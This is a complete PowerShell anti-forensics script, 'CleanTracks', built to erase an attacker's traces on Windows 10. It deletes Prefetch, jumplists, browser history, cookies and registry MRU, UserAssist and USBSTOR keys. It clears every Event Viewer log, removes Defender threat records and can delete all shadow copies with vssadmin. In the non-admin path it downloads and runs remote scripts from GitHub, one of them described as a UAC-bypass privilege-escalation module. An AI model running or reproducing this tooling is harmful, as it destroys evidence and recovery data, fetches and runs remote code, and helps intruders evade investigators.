<#
.SYNOPSIS
   Cover tracks \ Clean artifacts {anti-forensic}

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: cmd.exe {native}
   Optional Dependencies: wevtutil {native}
   PS cmdlet Dev version: v2.3.16

.DESCRIPTION
   Module to clean artifacts that migth lead forensic investigatores to attacker steps.
   This Module will clean the most used locations and registry keys in HKCU hive. if the
   cmdlet its executed with administrator privileges and 'Paranoid' argument its invoked,
   then it also clears Eventvwr logiles + StartUp items + HKLM hive pre-sellected keys.

.NOTES
   Administrator privileges are required to clean eventvwr, RestorePoints and HKLM keys.
   If invoked 'Paranoid' argument and administrator privileges are not met, then cmdlet
   uses UacMe EOP Module to elevate shell privileges before cleanning eventvwr logfiles. 

.Parameter CleanTracks
   Accepts arguments: Clear and Paranoid (default: clear)

.Parameter Verb
   Print outputs in verbose mode? (default: false)

.Parameter DelRestore
   Delete all RestorePoints Items? (default: false)

.EXAMPLE
   PS C:\> Get-Help .\CleanTracks.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Clear
   Clean Temp\Logs\Script artifacts left behind

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Paranoid
   Clean artifacts in paranoid mode (extensive cleanning)

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Paranoid -Verb True
   Clean artifacts in paranoid + verbose mode (print cleanned)

.EXAMPLE
   PS C:\> .\CleanTracks.ps1 -CleanTracks Paranoid -Verb True -DelRestore True
   Clean artifacts in paranoid + verbose mode + delete all restore points

.INPUTS
   None. You cannot pipe objects into CleanTracks.ps1

.OUTPUTS
   [i] Cover activity tracks on SKYNET
   [*] Token: Administrator privileges.
   [-] Cleaning: Multiple locations\Regedit.
       verbose : Cleaned DnsCache artifacts.
       verbose : Cleaned Cookies artifacts.
       verbose : Cleaned %Windir% artifacts.
       verbose : Cleaned %Recent% artifacts.
       verbose : Cleaned %Prefetch% artifacts.
       verbose : Cleaned %UserProfile% artifacts.
   [-] Cleaning: Jumplists folder artifacts.
       verbose : f01b4d95cf55d32a.automaticDestinations-ms
       verbose : 9b9cdc69c1c24e2b.automaticDestinations-ms
       verbose : 5f7b5f1e01b83767.automaticDestinations-ms
   [-] Cleaning: Temporary folder artifacts.
       verbose : C:\Users\pedro\AppData\Local\Temp\Nsudo.exe
       verbose : C:\Users\pedro\AppData\Local\Temp\023fdRtTs.log
       verbose : C:\Users\pedro\AppData\Local\Temp\PSexecutionPolicy.bat
   [-] Cleaning: Recycle bin folder artifacts.
       verbose : assistant_installer_20211208130743
       verbose : CUserspedroAppDataLocalProgramsOpera GX81.0.4196.61opera_autoupdate.metrics.lock
   [-] Cleaning: ConsoleHost_History records.
       verbose : nothing-to-see-here
   [-] Cleaning: StartUp directory artifacts.
       verbose : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persistence.vbs
   [-] Cleaning: Logfiles from Eventvwr snapin.
       verbose : Microsoft-Windows-Windows Defender/WHC
       verbose : Microsoft-Windows-AppModel-Runtime/Admin
       verbose : Microsoft-Windows-Websocket-Protocol-Component/Tracing

   Module      Date     ItemsDeleted ModifiedRegKeys ScriptsDeleted
   ----------- ----     ------------ --------------- --------------
   CleanTracks 22:17:29 1110         10              7

.LINK
   https://shorturl.at/jrE57
   https://github.com/r00t-3xp10it/msf-auxiliarys/blob/master/windows/auxiliarys/CleanTracks.rb
   https://www.crowdstrike.com/blog/how-to-employ-featureusage-for-windows-10-taskbar-forensics
   https://www.andreafortuna.org/2018/05/23/forensic-artifacts-evidences-of-program-execution-on-windows-systems
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$CleanTracks="false",
   [string]$DelRestore="false",
   [string]$Verb="false"
)


Write-Host "`n"
$ErrorActionPreference = "SilentlyContinue"
If($Verb -ieq "True"){$Char = "-"}Else{$Char = "*"}
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath
Write-Host "[i] Cover activity tracks on $Env:COMPUTERNAME" -ForegroundColor Green
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


#Check cmdlet mandatory dependencies
If($CleanTracks -ieq "False" -or $CleanTracks -ieq $null)
{
   Write-Host "    error: Cmdlet missing -Parameters inputs .." -ForegroundColor Red -BackgroundColor Black
   Start-Sleep -Milliseconds 3700;Clear-Host;Get-Help .\CleanTracks.ps1 -full;exit #Exit @CleanTracks
}

If($IsClientAdmin -Match '^(True)$')
{
   Write-Host "[*] Token: Administrator privileges." -ForegroundColor Blue
}
Else
{
   Write-Host "[*] Token: UserLand shell privileges." -ForegroundColor Yellow
}



If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid")
{

   #Local function variable declarations
   $Count = 0       ## Items to delete counter
   $MyArtifacts = 0 ## Scripts to delete counter
   [int]$ModRegKey = 0 ## Reg keys to modify counter
   $DateNow = Get-Date -Format 'HH:mm:ss' ## Time


   $ClearList = @(## Clear @arg
        "ipconfig /flushdns",
        "DEL /q /f %windir%\Temp\*.inf",
        "DEL /q /f %windir%\Temp\*.lnk",
        "DEL /q /f %windir%\Prefetch\*.pf",
        "DEL /q /f /s %userprofile%\*.log",
        "DEL /q /f /s %userprofile%\*.tmp",
        "DEL /q /f %appdata%\Microsoft\Windows\Recent\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f'
     )

   $ParanoidList = @(## Paranoid @arg
        "ipconfig /flushdns",
        "DEL /q /f %windir%\*.tmp",
        "DEL /q /f %windir%\*.log",
        "DEL /q /f %windir%\Temp\*.inf",
        "DEL /q /f %windir%\Temp\*.lnk",
        "DEL /q /f %windir%\system\*.tmp",
        "DEL /q /f %windir%\system\*.log",
        "DEL /q /f /s %userprofile%\*.tmp",
        "DEL /q /f /s %userprofile%\*.log",
        "DEL /q /f %windir%\Prefetch\*.pf",
        "DEL /q /f %windir%\system32\*.tmp",
        "DEL /q /f %windir%\system32\*.log",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
        "DEL /q /f /s %appdata%\Mozilla\Firefox\Profiles\*.*",
        "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
        'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\*.tmp',
        'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\History\*.*',
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f',
        'REG DELETE "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f',
        'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppBadgeUpdated" /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedPaths" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppBadgeUpdated" /ve /t REG_SZ /f',
        'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f'
     )


   #Counting of registry keys
   If($CleanTracks -ieq "Clear")
   {
      [int]$ModRegKey = "4"
   }
   ElseIf($CleanTracks -ieq "Paranoid")
   {
      [int]$ModRegKey = "9"   
   }


   If($IsClientAdmin -Match '^(True)$')
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Add extra keys to list if cmdlet its exec with admin privileges.

      .NOTES
         This function deletes the stored list of plugged USB devices, unloads dll's
         changes registry 'LastAccessedKey' value and deletes all restore points if set.
      #>

      If($DelRestore -ieq "True")
      {
         $ClearList += 'vssadmin delete shadows /for=%systemdrive% /all /quiet'
         $ParanoidList += 'vssadmin delete shadows /for=%systemdrive% /all /quiet'          
      }

      #Clear function list
      [int]$ModRegKey = [int]$ModRegKey + 4
      $ClearList += 'REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f'
      $ClearList += 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /ve /t REG_SZ /f'
      $ClearList += 'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v AlwaysUnloadDLL /t REG_SZ /d 1 /f'
      $ClearList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ClearList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'

      #Paranoid function list
      $ParanoidList += 'REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f'
      $ParanoidList += 'REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR" /ve /t REG_SZ /f'
      $ParanoidList += 'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v AlwaysUnloadDLL /t REG_SZ /d 1 /f'
      $ParanoidList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ParanoidList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
   }
   Else
   {
      [int]$ModRegKey = [int]$ModRegKey + 2
      #Add to list the 'update desktop' rundll32 api + registry last key accessed
      $ClearList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ClearList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
      $ParanoidList += 'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f'
      $ParanoidList += 'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
   }


   ## Loop trougth Array List { $ClearList + $ParanoidList }
   Write-Host "[$Char] Cleaning: Multiple locations\regedit." -ForegroundColor Blue
   If($CleanTracks -ieq "Clear")
   {
      ForEach($Item in $ClearList)
      {
         $Count++
         Start-Process -WindowStyle Hidden cmd.exe -ArgumentList "/R $Item"
      }
   }
   ElseIf($CleanTracks -ieq "Paranoid")
   {
      ForEach($Item in $ParanoidList)
      {
         $Count++
         Start-Process -WindowStyle Hidden cmd.exe -ArgumentList "/R $Item"
      }
   }

   If($verb -ieq "True")
   {
      #Print onScreen the locations beeing cleanned
      Write-Host "    verbose : Cleaned DnsCache artifacts."
      Start-Sleep -Milliseconds 200
      Write-Host "    verbose : Cleaned Cookies artifacts."
      Start-Sleep -Milliseconds 200
      Write-Host "    verbose : Cleaned %Windir% artifacts."
      Start-Sleep -Milliseconds 200
      Write-Host "    verbose : Cleaned %Recent% artifacts."
      Start-Sleep -Milliseconds 200
      Write-Host "    verbose : Cleaned %Prefetch% artifacts."
      Start-Sleep -Milliseconds 200
      Write-Host "    verbose : Cleaned %UserProfile% artifacts."
      If($DelRestore -ieq "True")
      {
         Start-Sleep -Milliseconds 200
         Write-Host "    verbose : Cleaned RestorePoints artifacts." -ForegroundColor Yellow
         Start-Sleep -Milliseconds 200
      }
   }

   #Delete artifacts {jumplist} from AutomaticDestinations
   $AutomaticDestinations = "$Env:APPDATA\Microsoft\Wind" + "ows\Recent\AutomaticDestinations" -Join ''
   Write-Host "[$Char] Cleaning: Jumplists folder artifacts." -ForegroundColor Blue;Start-Sleep -Milliseconds 400
   Get-ChildItem -Path "$AutomaticDestinations\*" -EA SilentlyContinue | ForEach-Object {
      Remove-Item -Path $_.FullName -Force|Out-Null
      If($?)
      {
         $Count = $Count+1
         If($Verb -ieq "True"){Write-Host "    verbose :"$_.FullName}
      }
   }


   #Delete all artifacts from %tmp% directory
   Write-Host "[$Char] Cleaning: Temporary folder artifacts." -ForegroundColor Blue;Start-Sleep -Milliseconds 400
   Get-ChildItem -Path "$Env:TMP\*" -Include *.exe,*.bat,*.vbs,*.hta,*.dll,*.inf,*.lnk,*.log,*.txt,*.py,*.png,*.zip,*.ps1 -EA SilentlyContinue | Where-Object {
     $_ -iNotMatch '(redpill.ps1|CleanTracks.ps1|Update-KB)' } | ForEach-Object {
      Remove-Item -Path $_.FullName -Force|Out-Null
      If($?)
      {
         $MyArtifacts = $MyArtifacts+1
         If($Verb -ieq "True"){Write-Host "    verbose :"$_.FullName}
      }
   }


   #Clear Recycle bin artifacts
   If(Get-Command "Clear-RecycleBin" -EA SilentlyContinue)
   {
      Write-Host "[$Char] Cleaning: Recycle bin folder artifacts." -ForegroundColor Blue;      
      If($verb -ieq "True")
      {
         $DeletedItem = (New-Object -ComObject Shell.Application).NameSpace(0x0a).Items()|Select-Object -ExpandProperty Name
         ForEach($Item in $DeletedItem)
         {
            Start-Sleep -Milliseconds 400
            Write-Host "    verbose : Cleaned $Item"
            $Count = $Count+1
         }
      }
      Start-Process -WindowStyle Hidden powershell -ArgumentList "Clear-RecycleBin -Force" -Wait
   }


   #Clear PowerShell Logging History
   If(-not($CleanPSLogging -ieq $null))
   {
      $Count = $Count+1
      echo "nothing-to-see-here"|Out-File "$CleanPSLogging" -Force
      Write-Host "[$Char] Cleaning: ConsoleHost_History records." -ForegroundColor Blue
      If($Verb -ieq "True"){Start-Sleep -Milliseconds 400;Write-Host "    verbose : nothing-to-see-here"}
   }



   If($CleanTracks -ieq "Paranoid")
   {

      <#
      .SYNOPSIS 
         Author: @r00t-3xp10it
         Helper - Delete ALL eventvwr logfiles + StartUp folder items.

      .NOTES
         Administrator privileges required to delete eventvwr logfiles.
      #>

      #Delete all artifacts from 'StartUp' directory
      Write-Host "[$Char] Cleaning: StartUp directory artifacts." -ForegroundColor Blue
      Start-Sleep -Milliseconds 400

      $PersistePath = "$Env:APPDATA\Microsoft\Windows" + "\Start Menu\Programs\" + "Startup\*" -join ''
      Get-ChildItem -Path "$PersistePath" -Include *.exe,*.bat,*.vbs,*.inf,*.hta,*.ps1,*.dll -EA SilentlyContinue | ForEach-Object {
         Remove-Item -Path $_.FullName -Force|Out-Null
         If($?)
         {
            $MyArtifacts = $MyArtifacts+1
            If($Verb -ieq "True"){Write-Host "    verbose :"$_.FullName}
         }
      }


      #Download\run Lnk-sweeper module
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Lnk-Sweeper.ps1" -OutFile "$Env:TMP\Lnk-Sweeper.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Unblock-File
      powershell -File "$Env:TMP\Lnk-Sweeper.ps1" -Action "clean" -PSBanner "false" -Paranoid True -TimeStamp "today"


      Write-Host "[$Char] Cleaning: Logfiles from Eventvwr snapin." -ForegroundColor Blue
      Start-Sleep -Milliseconds 400
      If($IsClientAdmin)
      {

         If($Verb -ieq "False")
         {
            Write-Host "    Warning : Please wait while we clean Eventvwr." -ForegroundColor Yellow
         }

         #Remove threats from defender vault
         Try{Remove-MpThreat}Catch{}

         $PSlist = wevtutil el | Where-Object {#Note: wevtutil cl => requires Administrator rigths to run
            $_ -iNotMatch '(Intel|Windows-Audio|Windows-Defrag|Windows-Kernel|Windows-Crypto|Windows-LiveId/Analytic|Windows-LiveId/Operational|Windows-USBVideo/Analytic|/Admin$)'
         }
        
         ForEach($PSCategorie in $PSlist)
         {
            $Count = $Count+1
            wevtutil cl "$PSCategorie"|Out-Null
            If($Verb -ieq "True")
            {
               Write-Host "    verbose : $PSCategorie"
            }
         }
         Write-Host "`n"

      }
      Else
      {

         <#
         .SYNOPSIS 
            Author: @r00t-3xp10it
            Helper - Delete ALL eventvwr logfiles using UacMe EOP module!

         .NOTES
            If invoked 'Paranoid' argumaent and administrator privileges are not met, then cmdlet
            uses UacMe EOP Module to elevate shell privileges before cleanning eventvwr logfiles. 
         #>

         #Download\Execute EOP module from my github
         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1" -OutFile "$Env:TMP\GetLogs.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Unblock-File
         powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Deleteall

      }

      #Clear Powershell history
      Clear-History|Out-Null

      #Clear ps1 scripts left behind
      If(Test-Path -Path "$Env:TMP\Lnk-Sweeper.ps1" -EA SilentlyContinue)
      {
         Remove-Item -Path "$Env:TMP\Lnk-Sweeper.ps1" -Force
      }
      If(Test-Path -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue)
      {
         Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force
      }

   }



   #Create Data Table for output onscreen
   $mytable = new-object System.Data.DataTable
   $mytable.Columns.Add("Module") | Out-Null
   $mytable.Columns.Add("Date") | Out-Null
   $mytable.Columns.Add("ItemsDeleted") | Out-Null
   $mytable.Columns.Add("ModifiedRegKeys") | Out-Null
   $mytable.Columns.Add("ScriptsDeleted") | Out-Null
   $mytable.Rows.Add("CleanTracks",
                     "$DateNow",
                     "$Count",
                     "$ModRegKey",
                     "$MyArtifacts") | Out-Null


   #Display Table OnScreen
   $mytable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -Match '^(Module)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'White' }
      }
      Write-Host @stringformat $_
   }

}